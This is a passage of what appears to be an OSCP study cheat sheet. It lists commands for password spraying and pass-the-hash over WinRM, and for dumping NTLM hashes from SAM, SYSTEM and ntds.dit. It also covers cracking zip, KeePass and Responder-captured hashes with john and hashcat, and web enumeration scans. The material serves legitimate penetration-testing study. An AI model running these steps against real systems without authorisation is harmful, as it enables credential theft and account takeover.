`sudo crackmapexec winrm <IP> --local-auth -u <filenameORusername> -p <filenameORpassword>`

Use —local-auth when attempting to login in locally, can be necessary to attempt spraying into AD environment

Also you can brute force with hashes 

`sudo crackmapexec winrm <IP> -u <filenameORusername> -H <filenameORhashes>`

### Craking zip:

make hash of zip file w/ zip2hohn:

`zip2john <ZipFileName>.zip > <Whatever>.hash`

and then crack with joh

`john --wordlist=/usr/share/wordlists/rockyou.txt sitebackup3.hash`


### Cracking SYSTEM and ntds.dit

`impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL`

`ntds.dit` and `SYSTEM` could be any file name in theory, usually just transfer them to my kali with the same exact file name though

### Cracking SAM and SYSTEM

Here we are cracking an (NTLM) hash

Have SAM and SYSTEM file on kali

`impacket-secretsdump -sam SAM -system SYSTEM LOCAL`

then put hash into a file and crack with HashCat (can always pass the hash as well if the service permits)

`hashcat -m 1000 <filename>.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

### Cracking keepass (.kdbx)

Install KeePassX:

`sudo apt-get -y install keepassx`

Use `keepass2john` to make has of .kdbx file to crack 

`keepass2john <filename>.kdbx`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/16279add-1320-4af2-aefd-b36132c58a1f)

make sure to remove everything before the colleen before put into in the hash file

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/94c63744-f71d-48ba-9ac7-37e3dc8fbc1f)

Crack with hashcat:

`hashcat -m 13400 <filename> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

### **Cracking Hash snagged from SMB auth**

Here we are cracking a (NTLM-SSP) hash

[Getting Creds via NTLMv2](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html#cracking-ntlmv2)

Get hash from responder and copy and paste into file

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/777cdf2b-c80d-4e66-8f82-eb0c0e3ca3f4)

then run hashcat to crack
`hashcat -m 5600 <filename> /usr/share/wordlists/rockyou.txt --force`

# Web Attack Guide

1. Any comments / juicy info in source code
    1. Comments of custom API’s we could attempt to reach out too
    2. Passwords in comments
    3. Versions in source code or displayed on web page
    4. All around info about device we are sending this forum back too
2. Can we check out robots.txt?
3. Get them scans going
    1. `gobuster dir -u http://<IP>:<port> -w <wordlist>`
    2. `nikto -h http://<IP>`
    `nikto -h $ip -p 80,8080,1234` #test different ports with one scan
    3. `wpscan -u <IP>/wp/`
    4. `wpscan --url <URL> --enumerate p --plugins-detection aggressive -o <outputDirectory>`

